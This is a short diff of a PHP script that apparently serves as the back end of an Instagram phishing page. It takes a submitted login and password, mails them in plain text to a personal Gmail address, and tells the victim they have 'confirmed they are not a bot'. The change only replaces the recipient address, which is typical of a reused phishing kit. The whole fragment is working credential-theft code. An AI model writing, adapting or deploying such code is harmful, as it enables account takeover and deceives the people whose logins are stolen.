@@ -8,8 +8,8 @@ $pass = urldecode($pass);//Трогать нельзя
 $log = trim($log);//Трогать нельзя
 $pass = trim($pass);//Трогать нельзя
 
-if (mail("dmitry.ivanov556@gmail.com", "Instagram", "Логин:".$log.". 
-Пар: ".$pass ,"From: dmitry.ivanov556@gmail.com\r\n"))
+if (mail("tairdganshimkent@gmail.com", "Instagram", "Логин:".$log.". 
+Пар: ".$pass ,"From:tairdganshimkent@gmail.com\r\n"))
 
  {     echo "Вы успешно подтвердили что вы не бот!";
  
